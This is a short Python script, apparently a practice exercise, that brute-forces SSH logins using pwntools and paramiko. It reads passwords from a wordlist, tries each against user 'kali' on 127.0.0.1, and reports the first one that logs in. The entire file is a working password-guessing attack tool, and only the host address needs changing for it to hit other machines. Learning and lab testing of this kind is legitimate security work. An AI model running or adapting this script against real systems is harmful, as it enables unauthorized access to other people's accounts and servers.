# ssh_bruForce.py
# Script for ssh login bruteforcing using paramiko module.
from pwn import *
import paramiko
# Handling authentication errors.
# Bruforce against local host.

host = "127.0.0.1"
username = "kali"
attempts = 0

with open('ssh_passwords.txt', 'r') as password_list:
	for password in password_list:
		password = password.strip("\n")
		# Handling authN errors
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print("[>] Valid password found: '{}!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts += 1